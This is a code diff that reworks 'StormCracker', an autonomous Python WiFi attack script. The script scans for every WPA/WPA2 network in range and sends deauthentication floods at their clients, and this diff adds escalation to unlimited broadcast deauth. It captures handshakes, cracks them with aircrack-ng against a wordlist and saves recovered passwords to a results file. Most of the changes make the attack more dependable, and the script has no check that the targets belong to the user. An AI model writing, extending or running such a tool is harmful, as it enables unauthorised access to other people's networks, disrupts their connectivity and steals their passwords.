@@ -31,16 +31,19 @@ def log(message):
     except Exception:
         pass
 
-def run_cmd(cmd, check=True):
+def run_cmd(cmd, check=True, timeout=None):
     try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check)
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check, timeout=timeout)
         return result.stdout
     except subprocess.CalledProcessError as e:
         log(f"Error executing: {cmd}\n{e.stderr}")
         return None
+    except subprocess.TimeoutExpired:
+        log(f"Timeout executing: {cmd}")
+        return None
 
 def check_dependencies():
-    tools = ["aircrack-ng", "aireplay-ng", "timeout", "iwconfig"]
+    tools = ["aircrack-ng", "aireplay-ng", "iwconfig", "airmon-ng"]
     missing = [tool for tool in tools if shutil.which(tool) is None]
     if missing:
         log(f"CRITICAL: Missing required tools: {', '.join(missing)}")
@@ -51,11 +54,13 @@ def kill_subprocesses():
     for proc in ACTIVE_PROCS:
         if proc.poll() is None:
             try:
-                os.kill(proc.pid, signal.SIGINT)
-                proc.wait(timeout=5)
+                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                proc.wait(timeout=2)
+            except ProcessLookupError:
+                pass
             except Exception:
                 try:
-                    os.kill(proc.pid, signal.SIGTERM)
+                    proc.terminate()
                 except Exception:
                     pass
     ACTIVE_PROCS.clear()
@@ -79,6 +84,10 @@ def get_monitor_interface(args):
     global ORIGINAL_MODE_RESTORE
     iface = args.interface
 
+    # --- KILL INTERFERING SERVICES (Fixes empty scans) ---
+    log("Killing interfering network services (NetworkManager, wpa_supplicant)...")
+    run_cmd("airmon-ng check kill", check=False)
+
     if not iface:
         output = run_cmd("iwconfig 2>/dev/null", check=False)
         if output:
@@ -101,12 +110,12 @@ def get_monitor_interface(args):
             elif available_ifaces:
                 iface = available_ifaces[0]
             else:
-                log("CRITICAL: No wireless interfaces detected on the system.")
+                log("CRITICAL: No wireless interfaces detected.")
                 sys.exit(1)
             
-            log(f"Auto-selected fallback interface: {iface}")
+            log(f"Auto-selected interface: {iface}")
         else:
-            log("CRITICAL: Failed to run iwconfig to detect interfaces.")
+            log("CRITICAL: Failed to run iwconfig.")
             sys.exit(1)
 
     log(f"Checking specified interface: {iface}")
@@ -116,8 +125,7 @@ def get_monitor_interface(args):
         log(f"Interface {iface} is already in monitor mode.")
         return iface
         
-    log(f"Interface {iface} is in Managed mode. Attempting to switch to Monitor mode...")
-    
+    log(f"Setting {iface} to Monitor mode...")
     run_cmd(f"ip link set {iface} down", check=False)
     run_cmd(f"iw dev {iface} set type monitor", check=False)
     run_cmd(f"ip link set {iface} up", check=False)
@@ -128,41 +136,61 @@ def get_monitor_interface(args):
         ORIGINAL_MODE_RESTORE = iface
         return iface
     else:
-        log(f"CRITICAL: Failed to put {iface} into monitor mode. Your card may not support it.")
+        log(f"CRITICAL: Failed to set {iface} to monitor mode.")
         sys.exit(1)
+
+# ========== UNIVERSAL PARSER (Fixes Header Hell) ==========
+def find_column_index(headers, possible_names):
+    """Find a header index by case-insensitive substring match."""
+    for i, h in enumerate(headers):
+        h_clean = h.strip().lower()
+        for p in possible_names:
+            if p in h_clean or h_clean in p:
+                return i
+    return -1
 
 def parse_scan_csv(csv_file, args):
     targets = []
-    if not os.path.exists(csv_file): return targets
+    if not os.path.exists(csv_file):
+        log(f"CSV file not found: {csv_file}")
+        return targets
     
     try:
         with open(csv_file, 'r', encoding='utf-8') as f:
             lines = f.readlines()
             
+        # Strip empty lines and stop at "Station MAC" (client section)
         ap_lines = []
         for line in lines:
-            if "Station MAC" in line:
+            if "Station MAC" in line or "Station" in line:
                 break
             if line.strip() == "":
                 continue
             ap_lines.append(line)
 
-        if not ap_lines: return targets
+        if not ap_lines:
+            log("CSV is empty (no AP data found).")
+            return targets
 
         reader = csv.reader(ap_lines)
         headers = next(reader, None)
-        if not headers: return targets
+        if not headers:
+            log("CSV has no headers.")
+            return targets
         
         headers = [h.strip() for h in headers]
-        
-        try:
-            bssid_idx = headers.index('BSSID')
-            channel_idx = headers.index('channel')
-            essid_idx = headers.index('ESSID')
-            privacy_idx = headers.index('Privacy')
-            power_idx = headers.index('Power')
-        except ValueError:
-            log("Error: CSV headers do not match expected airodump-ng format.")
+        log(f"Detected headers: {headers}")
+
+        # --- DYNAMIC MAPPING ---
+        bssid_idx = find_column_index(headers, ['bssid'])
+        channel_idx = find_column_index(headers, ['channel', 'ch'])
+        essid_idx = find_column_index(headers, ['essid'])
+        privacy_idx = find_column_index(headers, ['privacy', 'enc', 'encryption'])
+        power_idx = find_column_index(headers, ['power', 'pwr', 'signal'])
+
+        # Validate we found everything
+        if -1 in [bssid_idx, channel_idx, essid_idx, privacy_idx, power_idx]:
+            log("ERROR: Could not find required columns in CSV headers.")
             return targets
 
         for row in reader:
@@ -173,36 +201,37 @@ def parse_scan_csv(csv_file, args):
             channel = row[channel_idx].strip()
             essid = row[essid_idx].strip()
             privacy = row[privacy_idx].strip()
-            power = row[power_idx].strip()
+            power_raw = row[power_idx].strip()
             
             try:
-                power_val = int(power)
+                power_val = int(power_raw)
             except ValueError:
                 power_val = -100
 
-            if bssid and channel and "WPA" in privacy:
-                
+            # Filter: Must be WPA/WPA2 and have valid signal
+            if bssid and channel and ("WPA" in privacy or "WPA2" in privacy):
                 if args.target and args.target not in (essid, bssid):
                     continue
-                    
-                if power_val < args.min_signal:
+                if power_val < args.min_signal or power_val == -1:
                     continue
-                    
+                
                 targets.append({
                     'bssid': bssid,
                     'channel': channel,
-                    'essid': essid,
+                    'essid': essid if essid else "<Hidden>",
                     'power': power_val
                 })
+                
     except Exception as e:
-        log(f"Error parsing scan CSV: {e}")
+        log(f"Error parsing CSV: {e}")
         
     targets.sort(key=lambda x: x['power'], reverse=True)
     return targets
 
 def get_active_clients(csv_file, target_bssid):
     clients = []
-    if not os.path.exists(csv_file): return clients
+    if not os.path.exists(csv_file): 
+        return clients
     try:
         with open(csv_file, 'r', encoding='utf-8') as f:
             lines = f.readlines()
@@ -225,7 +254,7 @@ def get_active_clients(csv_file, target_bssid):
 
 def has_handshake(cap_file):
     output = run_cmd(f"aircrack-ng {cap_file}", check=False)
-    return output and "1 handshake" in output
+    return output and ("1 handshake" in output or "Handshake" in output)
 
 def run_auditor(args):
     if os.geteuid() != 0:
@@ -235,7 +264,7 @@ def run_auditor(args):
     signal.signal(signal.SIGINT, cleanup)
     signal.signal(signal.SIGTERM, cleanup)
 
-    log("=== Autonomous WiFi Auditor Initialized ===")
+    log("=== StormCracker Autonomous WiFi Auditor Initialized ===")
     
     try:
         check_dependencies()
@@ -249,58 +278,97 @@ def run_auditor(args):
         
         interface = get_monitor_interface(args)
 
+        # ========== PHASE 1: SCAN (Manual Process Control) ==========
         log(f"Phase 1: Starting broad scan ({SCAN_TIMEOUT}s)...")
         scan_id = int(time.time())
         scan_prefix = os.path.join(TEMP_DIR, f"scan_{scan_id}")
-        scan_cmd = f"timeout --signal=SIGINT {SCAN_TIMEOUT}s airodump-ng -w {scan_prefix} --output-format csv {interface} < /dev/null > /dev/null 2>&1"
-        run_cmd(scan_cmd, check=False)
+        
+        # Run airodump in the background (no 'timeout' wrapper)
+        scan_cmd = f"airodump-ng -w {scan_prefix} --output-format csv {interface}"
+        scan_proc = subprocess.Popen(
+            scan_cmd,
+            shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.PIPE,
+            text=True,
+            start_new_session=True
+        )
+        ACTIVE_PROCS.append(scan_proc)
+        
+        # Let it run for the specified time
+        time.sleep(SCAN_TIMEOUT)
+        
+        # Gracefully kill it with SIGINT (so it flushes the CSV)
+        os.killpg(os.getpgid(scan_proc.pid), signal.SIGINT)
+        scan_proc.wait(timeout=5)
+        
+        # Capture stderr to see if the card complained
+        stderr_output = scan_proc.stderr.read()
+        if stderr_output:
+            log(f"airodump-ng warnings: {stderr_output.strip()}")
+        
+        ACTIVE_PROCS.remove(scan_proc)
+        time.sleep(1.5)  # Extra time for file flush
 
-        targets = parse_scan_csv(f"{scan_prefix}-01.csv", args)
-
-        if not targets:
-            log("No capable WPA/WPA2 targets found matching criteria.")
+        csv_path = f"{scan_prefix}-01.csv"
+        if not os.path.exists(csv_path) or os.path.getsize(csv_path) == 0:
+            log("CRITICAL: Scan CSV is empty or missing. Check if interface is capturing.")
+            # Fallback: try to read headers anyway
+            if os.path.exists(csv_path):
+                log("CSV exists but has 0 bytes. Driver may not support monitor mode on this channel.")
             return
 
-        log(f"Phase 2: Targeted capture starting for {len(targets)} networks...")
+        targets = parse_scan_csv(csv_path, args)
 
+        if not targets:
+            log("No WPA/WPA2 targets found. Check signal strength or target filters.")
+            return
+
+        # ========== PHASE 2: CAPTURE ==========
+        log(f"Phase 2: Targeting {len(targets)} networks...")
         captured_caps = []
+
         for target in targets:
             clean_essid = "".join([c if c.isalnum() else "_" for c in target['essid']]) or "unknown"
             expected_save_path = os.path.join(HANDSHAKES_DIR, f"{clean_essid}_{target['bssid'].replace(':', '')}.cap")
             
             if os.path.exists(expected_save_path) and has_handshake(expected_save_path):
-                log(f"Skipping capture: Valid handshake already secured for {target['essid']}.")
+                log(f"Skipping: Handshake already exists for {target['essid']}.")
                 captured_caps.append(expected_save_path)
                 continue
                 
-            log(f"Locking on: {target['essid']} ({target['bssid']}) | PWR: {target['power']} | CH: {target['channel']}")
+            log(f"Locking: {target['essid']} ({target['bssid']}) | PWR: {target['power']} | CH: {target['channel']}")
             
             cap_prefix = os.path.join(TEMP_DIR, f"cap_{target['bssid'].replace(':', '')}")
-            dump_cmd = f"timeout --signal=SIGINT {args.timeout}s airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_prefix} --output-format pcap,csv {interface} < /dev/null > /dev/null 2>&1"
+            dump_cmd = f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_prefix} --output-format pcap,csv {interface}"
             
-            dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            dump_proc = subprocess.Popen(
+                dump_cmd,
+                shell=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                start_new_session=True
+            )
             ACTIVE_PROCS.append(dump_proc)
             
             start_time = time.time()
             handshake_found = False
             last_deauth = 0
+            deauth_escalation = 0
             
             while time.time() - start_time < args.timeout:
                 cap_files = glob.glob(f"{cap_prefix}-*.cap")
                 if cap_files:
                     current_cap = sorted(cap_files)[-1]
                     if has_handshake(current_cap):
-                        log(f"Success! Handshake secured for {target['essid']}.")
-                        
+                        log(f"Success! Handshake captured for {target['essid']}.")
                         shutil.copy(current_cap, expected_save_path)
-                        log(f"Capture archived: {expected_save_path}")
-                        
                         captured_caps.append(expected_save_path)
                         handshake_found = True
                         kill_subprocesses()
                         break
                 
-                if time.time() - last_deauth > 15:
+                if time.time() - last_deauth > 12:
                     csv_files = glob.glob(f"{cap_prefix}-*.csv")
                     clients = []
                     if csv_files:
@@ -308,118 +376,101 @@ def run_auditor(args):
                     
                     if clients:
                         for client in set(clients):
-                            log(f"Targeted deauth: Prodding client {client} on {target['essid']}...")
+                            log(f"Deauthing client: {client}")
                             run_cmd(f"aireplay-ng -0 {DEAUTH_PACKETS} -a {target['bssid']} -c {client} {interface} < /dev/null > /dev/null 2>&1", check=False)
                     else:
-                        log(f"No clients seen yet. Sending broadcast deauth to {target['essid']}...")
-                        run_cmd(f"aireplay-ng -0 {DEAUTH_PACKETS} -a {target['bssid']} {interface} < /dev/null > /dev/null 2>&1", check=False)
+                        log(f"No clients. Broadcast deauth to {target['essid']}...")
+                        if deauth_escalation > 2:
+                            run_cmd(f"aireplay-ng -0 0 -a {target['bssid']} {interface} < /dev/null > /dev/null 2>&1", check=False)
+                        else:
+                            run_cmd(f"aireplay-ng -0 {DEAUTH_PACKETS} -a {target['bssid']} {interface} < /dev/null > /dev/null 2>&1", check=False)
+                        deauth_escalation += 1
                     
                     last_deauth = time.time()
 
                 time.sleep(2)
             
             if not handshake_found:
-                log(f"Incomplete: {target['essid']} remains elusive.")
+                log(f"Failed to capture handshake for {target['essid']}.")
                 kill_subprocesses()
 
+        # ========== PHASE 3: CRACKING ==========
         if args.skip_crack:
-            log("Phase 3: Skipping crack phase as requested.")
+            log("Skipping crack phase.")
             return
 
         if captured_caps:
-            log(f"Phase 3: Initiating batch crack on {len(captured_caps)} handshakes using Aircrack-ng...")
-            
+            log(f"Phase 3: Cracking {len(captured_caps)} handshakes...")
             print("\n" + "="*50)
-            print("HANDING OVER TERMINAL TO AIRCRACK-NG")
+            print("AIRCRACK-NG ENGINE")
             print("="*50 + "\n")
             
             cracked_count = 0
-            
             for cap in captured_caps:
                 essid = os.path.basename(cap).split('_')[0] 
-                log(f"Cracking target: {essid}...")
-                
+                log(f"Cracking: {essid}")
                 temp_key_file = os.path.join(TEMP_DIR, f"{essid}_key.txt")
                 if os.path.exists(temp_key_file):
                     os.remove(temp_key_file)
                 
                 crack_cmd = f"aircrack-ng -w {args.wordlist} -l {temp_key_file} {cap}"
-                
                 try:
                     subprocess.call(crack_cmd, shell=True)
                 except KeyboardInterrupt:
-                    print(f"\n[SYSTEM] Aircrack-ng interrupted for {essid}. Moving to next target...")
+                    print(f"\nInterrupted for {essid}. Moving on...")
                     continue
                 
                 if os.path.exists(temp_key_file):
                     with open(temp_key_file, 'r') as f:
                         password = f.read().strip()
-                        
                     if password:
-                        log(f"VICTORY! [{essid}] Key found: {password}")
+                        log(f"VICTORY! [{essid}] Password: {password}")
                         with open(CRACKED_PASSWORDS_FILE, "a") as cpf:
-                            cpf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {essid} | Key: {password}\n")
+                            cpf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {essid} | {password}\n")
                         cracked_count += 1
-                    
                     os.remove(temp_key_file)
                 else:
                     log(f"Failed to crack {essid}.")
             
             print("\n" + "="*50)
-            print("AIRCRACK-NG ENGINE FINISHED - RESUMING SCRIPT")
-            print("="*50 + "\n")
-            
-            log(f"Batch assault complete. Passwords recovered: {cracked_count}.")
+            log(f"Cracking complete. Found {cracked_count} passwords.")
             if cracked_count > 0:
-                log(f"Trophy list available at: {CRACKED_PASSWORDS_FILE}")
+                log(f"Results saved to: {CRACKED_PASSWORDS_FILE}")
         else:
-            log("No handshakes were secured during this foray.")
+            log("No handshakes captured.")
 
     finally:
         cleanup()
-        log("=== Audit Session Concluded ===")
+        log("Session concluded.")
 
 def parse_args():
-    parser = argparse.ArgumentParser(
-        description="StormCracker Autonomous WiFi Auditor",
-        formatter_class=argparse.RawTextHelpFormatter,
-        epilog="Examples:\n"
-               "  Autonomous Run:      sudo python3 wifi_auditor.py\n"
-               "  Target Specific AP:  sudo python3 wifi_auditor.py -t 'My Network'\n"
-               "  Filter Weak Signals: sudo python3 wifi_auditor.py -s -70\n"
-               "  Capture Only:        sudo python3 wifi_auditor.py --skip-crack"
-    )
-    
-    parser.add_argument("-i", "--interface", help="Monitor mode interface to use (e.g., wlan1)")
-    parser.add_argument("-w", "--wordlist", default=WORDLIST_DEFAULT, help=f"Path to wordlist (default: {WORDLIST_DEFAULT})")
-    parser.add_argument("-t", "--target", help="Specific ESSID or BSSID to target")
-    parser.add_argument("-s", "--min-signal", type=int, default=-100, help="Minimum signal strength (default: -100 to capture everything)")
-    parser.add_argument("--timeout", type=int, default=CAPTURE_TIMEOUT_DEFAULT, help=f"Capture timeout per target in seconds (default: {CAPTURE_TIMEOUT_DEFAULT})")
-    parser.add_argument("--skip-crack", action="store_true", help="Skip Hashcat cracking phase after capture")
-    
+    parser = argparse.ArgumentParser(description="StormCracker WiFi Auditor")
+    parser.add_argument("-i", "--interface", help="Interface (e.g., wlan1)")
+    parser.add_argument("-w", "--wordlist", default=WORDLIST_DEFAULT)
+    parser.add_argument("-t", "--target", help="Target ESSID or BSSID")
+    parser.add_argument("-s", "--min-signal", type=int, default=-100)
+    parser.add_argument("--timeout", type=int, default=CAPTURE_TIMEOUT_DEFAULT)
+    parser.add_argument("--skip-crack", action="store_true")
     return parser.parse_args()
 
 if __name__ == "__main__":
     args = parse_args()
     
     if os.environ.get("WIFI_AUDITOR_INHIBITED") != "1":
-        print("[SYSTEM] Engaging Wake Lock to prevent sleep...")
+        print("[SYSTEM] Engaging Wake Lock...")
         cmd = [
             "systemd-inhibit",
             "--what=sleep:idle",
             "--who=WiFi Auditor",
-            "--why=Running long security audit",
+            "--why=Running audit",
             sys.executable
         ] + sys.argv
-        
         env = os.environ.copy()
         env["WIFI_AUDITOR_INHIBITED"] = "1"
-        
         try:
-            result = subprocess.run(cmd, env=env)
-            sys.exit(result.returncode)
+            subprocess.run(cmd, env=env)
         except FileNotFoundError:
-            print("[SYSTEM] systemd-inhibit not found. Wake lock disabled. Running normally...")
+            print("[SYSTEM] Wake lock unavailable. Running directly.")
             run_auditor(args)
         except KeyboardInterrupt:
             sys.exit(130)
